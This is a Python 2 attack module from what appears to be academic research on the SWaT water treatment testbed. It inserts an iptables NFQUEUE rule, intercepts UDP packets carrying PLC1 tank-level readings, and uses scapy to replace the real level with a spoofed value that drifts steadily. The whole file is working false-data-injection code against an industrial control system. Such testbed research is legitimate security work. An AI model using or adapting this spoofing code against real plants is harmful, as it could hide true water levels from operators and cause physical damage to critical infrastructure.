#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to change the slope of the water level by calculating with a
constant bias to the water flow in PLC 1.
"""
from __future__ import print_function

import math
import os
import sys
from netfilterqueue import NetfilterQueue

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from commons.util import RepeatEvery
from swat.plc1 import SWAT_P1_RIO_AI
from swat.scaling import current_to_signal, signal_to_current, P1Level

DIA = 1.38  # Tank 1 diameter
FLOW_BIAS = 0.8  # Water flow in m^3/h
_alevel = 0
_elevel = 0
_is_first_pck = True


def calculate_attack():
    global _alevel
    _alevel += (FLOW_BIAS / (3600 * math.pi * math.pow(DIA / 2, 2)))


thread = RepeatEvery(1, calculate_attack)


def __inject(packet):
    pkt = IP(packet.get_payload())
    if SWAT_P1_RIO_AI in pkt:
        global _elevel, _alevel, _is_first_pck
        if _is_first_pck:
            _elevel = _alevel = current_to_signal(pkt[SWAT_P1_RIO_AI].level, P1Level) / 1000
            thread.start()
            _is_first_pck = False
        alevel = signal_to_current(_alevel * 1000, P1Level)
        pkt[SWAT_P1_RIO_AI].level = alevel
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    try:
        print("[*] starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        thread.stop()
        thread.join()
        nfqueue.unbind()
        print("[*] stopping water level spoofing")
    return 0


def configure():
    global FLOW_BIAS
    FLOW_BIAS = input('Set Water Flow Bias: ')
    params()


def params():
    print('Water FLow Bias: ', FLOW_BIAS)


def __setup():
    global _is_first_pck
    _is_first_pck = True
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')


if __name__ == '__main__':
    sys.exit(start())
